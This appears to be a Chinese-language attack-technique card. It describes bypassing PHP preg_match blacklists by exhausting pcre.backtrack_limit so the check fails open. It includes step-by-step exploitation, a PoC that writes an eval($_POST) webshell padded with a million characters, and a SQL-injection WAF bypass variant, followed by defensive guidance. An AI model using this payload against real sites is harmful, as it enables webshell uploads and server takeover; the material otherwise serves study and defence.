---
id: web-php-rce-pcre-backtrack-limit-false-filter-bypass
title: 超长输入触发 PCRE 回溯上限：preg_match 返回 false 被当“未匹配”，绕过正则黑名单上传 WebShell
type: scenario
domain: web
path: web/php/rce
technique: pcre-backtrack-limit-false-filter-bypass
aliases:
- ReDoS 绕过正则
- preg_match 返回 false
- 回溯陷阱
- pcre.backtrack_limit
- 超长 aaaa 绕过
- 正则回溯绕过
- PCRE backtrack limit bypass
tags:
- php
- preg_match
- pcre
- backtracking
- redos
- waf-bypass
- file-upload
- webshell
- filter-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V372
  verified_at: '2026-11-09T06:08:43+08:00'
  notes: '已对照原文全文与图01-05核对：正则 /<\?.*[(`;?>].*/is、payload ''aaa<?php eval($_POST[txt]);//''+100万个a、pcre.backtrack_limit=1000000、bool(false)+successful 均与原文一致；卡明确区分 ReDoS/DoS 与过滤绕过，最终 sink 为上写 WebShell，非纯 DoS。未验证点：原文图03同时出现 Notice: Undefined index: file，说明该次截图未实际带上传文件，''文件被写入并可访问''未见落盘截图，实际落盘依赖真实 file 字段；与 htaccess 改 pcre.backtrack_limit 卡(cos0.908)触发方式(长输入自然耗尽 vs 写配置)与PoC不同，非同一链；dedup 本人复跑=new(1 duplicate 为自身)；dup-scan(11-08)早于建卡；无sources/source_url；原文未给受影响版本--clear。'
---

## 一句话结论

PHP 的 `preg_match()` 在匹配过程超过 `pcre.backtrack_limit`（默认 1000000）时返回 `false`；若代码写成 `if (preg_match(...))` 或 `if (!preg_match(...))` 只用布尔真假判断，`false` 会被当成“没有匹配/没有危险”而放行。原文用 `aaa<?php eval($_POST[txt]);//` 加一百万个 `a` 让 `/<\?.*[(`;?>].*/is` 回溯超限返回 `false`，绕过上传前的 PHP 内容检测并写入 WebShell；同一手法也能让 SQL 注入 WAF 的 `SELECT.+FROM.+` 类正则失配放行。

## 原理

- **`preg_match` 三种返回值**：匹配返回 `1`，不匹配返回 `0`，发生错误（包括超过 `pcre.backtrack_limit`/`pcre.recursion_limit`、JIT 栈耗尽等）返回 `false`。很多代码只区分“真/假”，把错误 `false` 与“不匹配 0”混为一谈。
- **NFA 回溯放大**：PCRE 是回溯型引擎。`/<\?.*[(`;?>].*/is` 中第一个 `.*` 会先吃掉整段输入，再为匹配 `[(`;?>]` 逐字符回退；输入是一长串不包含这些字符的 `a` 时，回退次数与长度成正比甚至指数增长（嵌套量词如 `(a+)+` 更严重）。超过默认 100 万次后 PCRE 放弃并让 `preg_match` 返回 `false`。
- **布尔判断缺陷**：目标代码 `if (is_php($data)) { bad } else { upload }` 把 `false` 当成“不是 PHP 文件”，进入 else 写入上传文件；如果代码是 `if (!preg_match(...)) { 放行 }`，`!false === true` 同样放行。正确写法必须区分 `=== 1`、`=== 0` 与 `=== false`。
- **Payload 构造**：恶意内容（`<?php eval(...);`）放在前缀，后面接足够长的填充字符（原文 `a * 1000000`），让 `.*` 在填充段上耗尽回溯预算；PHP 因超限返回 `false`，过滤器失效而文件内容本身仍是可执行 PHP。
- **WAF 场景**：`preg_match('/SELECT.+FROM.+/is', $input)`、`/UNION.+?SELECT/is` 等 WAF 规则同样有 `.+` 与可选/贪婪量词；在关键字之间插入长注释/填充（原文 `UNION/*aaaaa*/SELECT`）可触发回溯失败，使 WAF 返回 false 而放行注入语句。
- **与纯 ReDoS 的区别**：ReDoS 以拖慢/打瘫服务为目标；本场景把“回溯超限导致 false”当作**过滤绕过原语**，最终落点是文件上传 RCE 或 SQL 注入，不是拒绝服务。

## 触发条件

- PHP 代码使用 `preg_match()` 做安全判断，且返回值只参与布尔判断，没有显式比较 `=== 1`/`=== 0`。
- 正则包含易回溯结构（`.*`/`.+` 后接字符类、嵌套量词 `(a+)+`、交替重叠 `(a|aa)+` 等），且攻击者能控制足够长的输入。
- `pcre.backtrack_limit` 使用默认值（1000000）或较小值；输入长度/上传大小限制允许约 1MB 级内容。
- 该正则的判定结果直接控制敏感 sink（文件上传放行、SQL 查询拼接、命令执行等）。
- 目标未在正则失败时按“拒绝/报错”处理（fail-open）。

## 利用步骤

1. 审源码/流量找 `preg_match` 保护点：上传前内容检测、WAF 规则、参数白名单；确认判断写法是 `if (preg_match(...))` 或 `if (!preg_match(...))` 而不是 `=== 1/0`。
2. 分析正则的可回溯点：`.*`/`.+` 与后续字符类、嵌套分组、重叠交替；构造一个必然无法匹配但能触发大量回退的输入。
3. 构造 payload：前缀放恶意内容（PHP 代码/SQL 片段），后缀接长串填充字符（如 `a` × 1,000,000），保证总长度在上传/请求限制内。
4. 提交到目标；观察 `preg_match` 是否返回 `false`（可先在本地同版本 PHP 或用回显调试确认），过滤器是否进入放行分支。
5. 触发 sink：上传文件被写入 `.php` 路径后访问执行；SQL 场景观察注入结果/WAF 是否放行。
6. 若长度受限，改用嵌套量词正则或分段/压缩填充提高每次字符的回溯代价。

## PoC

原文文件上传场景（目标代码简化）：

```php
function is_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}
$data = file_get_contents($file_name);
if (is_php($data)) {
    echo "bad request";
} else {
    move_uploaded_file($_FILES['file']['tmp_name'], $path); // 写入 .php
}
```

生成绕过文件（前缀为 PHP 代码，后缀为 100 万个 a）：

```python
payload = 'aaa<?php eval($_POST["txt"]);//' + 'a' * 1000000
open('webshell_flag.php', 'w').write(payload)
```

原文实测：`var_dump(is_php($data))` 输出 `bool(false)`，页面显示 `successful`，文件被写入并可访问。默认 `pcre.backtrack_limit` 在原文环境为 `1000000`（`ini_get` 截图）。

WAF 变体（原文示例）：

```php
if (preg_match('/UNION.+?SELECT/is', $input)) { die('SQL Injection'); }
```

```text
UNION/*aaaaa*/SELECT ...
```

（填充长度需按目标正则与回溯预算调整；原文只给出短填充示例，实际利用以触发 `false` 为准。）

## 变体与关联

- 变体：`.htaccess`/`.user.ini` 把 `pcre.backtrack_limit` 设为 0（无需长输入，但需要能改配置）；`pcre.recursion_limit` 调低；JIT 关闭后回溯路径更稳定。
- 关联：[[web-php-rce-htaccess-pcre-backtrack-limit-bypass]]（同一“false 当未匹配”缺陷，但通过配置改 limit；本卡是通过攻击者输入自然耗尽回溯预算，无需改配置，触发条件与 PoC 不同）、[[web-php-rce-regex-backslash-escape-command-injection]]（正则转义层绕过）。
- 边界：代码若写 `preg_match(...) === 1` 或 `!== 1` 时拒绝、或对 `false` 单独拦截，本手法失效；输入长度/上传大小限制、RE2/DFA 引擎、无回溯正则也会阻断。

## 检测与防御

- **代码层**：所有 `preg_match` 安全判断必须显式比较 `=== 1`/`=== 0`，把 `false` 当成错误并拒绝（fail-closed）；不要用 `if (preg_match(...))` 或 `if (!preg_match(...))` 直接判断。
- **正则层**：避免 `.*`/`.+` 与字符类组合、嵌套量词、重叠交替；用非捕获组、锚点、字符白名单缩小回溯；对输入长度先做上限（如 64KB）再匹配。
- **引擎/配置**：设置合理的 `pcre.backtrack_limit`、`pcre.recursion_limit`，但不要依赖它做安全边界；高安全场景使用 RE2/DFA 引擎或自写解析器。
- **WAF**：正则匹配失败时按拦截处理（fail-closed），不要放行；对超长请求体、异常填充、`.htaccess` 中的 `pcre.*` 配置做监控。
- **上传**：内容检测使用多种手段（MIME、magic bytes、解析器白名单、随机化后缀/不可执行目录），不要只依赖一条正则。
